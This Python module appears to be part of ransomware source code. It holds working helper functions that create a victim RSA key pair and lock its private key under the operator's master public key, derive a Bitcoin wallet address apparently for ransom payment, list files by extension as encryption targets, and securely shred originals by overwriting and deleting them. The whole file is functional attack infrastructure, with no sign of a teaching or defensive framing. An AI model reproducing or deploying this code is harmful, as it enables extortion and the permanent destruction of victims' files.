import logging
import hashlib
from random import randint
from os import urandom, remove, path, listdir
from asymmetric_encryption import RSA, ECC
from config import (
    ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
    MASTER_PUBLIC_KEY,
    ENCRYPTED_BITCOIN_KEY_LOCATION,
    BITCOIN_WALLET_ID_PATH,
    REQUIRED_FILE_FORMAT,
)
from pickle import load, dump, HIGHEST_PROTOCOL


logger = logging.getLogger(__name__)


def write_data_to_file(file_path, data, serialized=True):
    logger.info(f"Writing data to {file_path}")
    file = open(file_path, "wb")
    if serialized:
        file.write(data)
    else:
        dump(data, file, HIGHEST_PROTOCOL)
    file.close()


def read_data_from_file(file_path, serialized=True):
    logger.info(f"Reading data from {file_path}")
    file = open(file_path, "rb")
    if serialized:
        file_data = file.read()
    else:
        file_data = load(file)
    file.close()
    return file_data


def shred_file(file_path):
    logger.info(f"Shredding file {file_path}")
    with open(file_path, "ab+") as file_to_be_deleted:
        length = file_to_be_deleted.tell()

    with open(file_path, "br+") as file_to_be_deleted:
        for _ in range(randint(3, 11)):
            file_to_be_deleted.seek(0)
            file_to_be_deleted.write(urandom(length))

    with open(file_path, "br+") as file_to_be_deleted:
        for x in range(length):
            file_to_be_deleted.write(b"\x00")

    remove(file_path)


def generate_rsa_key_pair():
    logger.info("Generating RSA key pair")
    cipher = RSA()
    serialized_private_key = cipher.private_key
    serialized_public_key = cipher.public_key

    logger.info("Encrypting RSA private key")
    cipher = RSA(public_key=MASTER_PUBLIC_KEY)
    encrypted_private_key = cipher.encrypt_large_data(serialized_private_key)

    logger.info("Storing encrypted RSA private key in disk")
    write_data_to_file(
        ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, encrypted_private_key, False
    )

    return serialized_public_key


def sha256(data):
    sha256 = hashlib.sha256()
    sha256.update(data)
    return sha256.hexdigest()


def ripemd160(data):
    ripemd160 = hashlib.new("ripemd160")
    ripemd160.update(data)
    return ripemd160.hexdigest()


def base58(data):
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    b58_string = ""

    leading_zeros = len(data) - len(data.lstrip("0"))
    address_int = int(data, 16)

    while address_int > 0:
        digit = address_int % 58
        digit_char = alphabet[digit]
        b58_string = digit_char + b58_string
        address_int //= 58
    ones = leading_zeros // 2
    for one in range(ones):
        b58_string = "1" + b58_string

    return b58_string


def generate_bitcoin_address():
    logger.info("Generating ECC key pair")
    cipher = ECC()
    serialized_private_key = cipher.private_key
    serialized_public_key = cipher.public_key

    logger.info("Encrypting ECC private key")
    cipher = RSA(public_key=MASTER_PUBLIC_KEY)
    encrypted_private_key = cipher.encrypt_large_data(serialized_private_key)

    logger.info("Storing encrypted ECC private key in disk")
    write_data_to_file(ENCRYPTED_BITCOIN_KEY_LOCATION, encrypted_private_key, False)

    logger.info("Generating Bitcoin Wallet Address from ECC Public key")
    hashed_public_key_hex = ripemd160(bytes.fromhex(sha256(serialized_public_key)))
    key_with_network_byte = f"00{hashed_public_key_hex}"
    checksum = sha256(bytes.fromhex(sha256(bytes.fromhex(key_with_network_byte))))
    hex_address = f"{key_with_network_byte}{checksum[:8]}"
    wallet_address = base58(hex_address)

    write_data_to_file(BITCOIN_WALLET_ID_PATH, wallet_address.encode("utf-8"))

    return wallet_address


def get_files_to_be_encrypted(directory):
    logger.info(f"Discovering files in {directory}")
    files_to_encrypted = [
        f"{directory}/{file}"
        for file in listdir(directory)
        if path.splitext(f"{directory}/{file}")[1].upper() in REQUIRED_FILE_FORMAT
    ]
    return files_to_encrypted

